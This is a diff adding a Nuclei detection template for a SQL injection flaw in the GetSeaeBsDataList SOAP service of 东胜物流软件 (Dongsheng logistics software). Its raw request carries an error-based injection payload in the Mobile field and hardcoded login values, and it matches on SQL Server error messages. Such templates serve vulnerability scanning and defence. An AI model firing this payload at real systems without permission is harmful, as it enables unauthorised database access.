@@ -1,0 +1,56 @@
+id: dongshengsoft-getseaebsdatalist-sqli
+info:
+  name: 东胜物流软件 GetSeaeBsDataList SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in 东胜物流软件's GetSeaeBsDataList service. This allows attackers to exploit the SQL query logic.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /Webservice/DsWebService.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/GetSeaeBsDataList"
+
+        <soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
+           <soap:Header/>
+           <soap:Body>
+              <dsw:GetSeaeBsDataList>
+                 <!--Optional:-->
+                 <dsw:LoginName>qdtaize</dsw:LoginName>
+                 <!--Optional:-->
+                 <dsw:LoginPass>EBBE3242-D49E-4398-BBFE-0133CA655EB5</dsw:LoginPass>
+                 <!--Optional:-->
+                 <dsw:Mobile>1')or 1&lt;sys.fn_varbintohexstr(hashbytes('MD5','{{t1}}'))--</dsw:Mobile>
+                 <!--Optional:-->
+                 <dsw:Mblno>1</dsw:Mblno>
+                 <dsw:start>1</dsw:start>
+                 <dsw:limit>1</dsw:limit>
+              </dsw:GetSeaeBsDataList>
+           </soap:Body>
+        </soap:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "0x{{t2}}"
+          - "GetSeaeBsDataList"
+      - type: word
+        part: header
+        words:
+          - "application/soap+xml"
+      - type: regex
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
